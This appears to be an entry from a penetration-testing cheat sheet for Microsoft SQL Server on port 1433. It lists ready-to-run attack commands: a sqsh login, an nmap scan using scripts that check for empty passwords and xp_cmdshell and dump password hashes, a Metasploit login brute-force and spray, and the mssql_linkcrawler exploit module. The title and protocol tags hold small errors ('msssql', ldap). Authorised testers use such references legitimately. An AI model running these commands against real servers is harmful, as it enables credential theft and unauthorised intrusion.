# msssql

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/ldap  #port/1433 

## mssql - connect
#cat/ATTACK/CONNECT 
```
sqsh -S <IP> -U <USER>
```

## mssql - enum
#cat/RECON
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## mssql - enum sql login
#cat/ATTACK/BRUTEFORCE-SPRAY 
```
msfconsole -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS <IP>; set USER_FILE <user_file>; set PASS_FILE <pass_file>; run'
```

## mssql - enum configuration setting (xp-cmdshell)
#cat/RECON 
```
msfconsole -x 'use auxiliary/admin/mssql/mssql_enum; set RHOST <IP>; set password <PASSWORD>; run'
```

## mssql link crawler
#cat/ATTACK/EXPLOIT 
```
msfconsole -x 'use exploit/windows/mssql/mssql_linkcrawler'
```
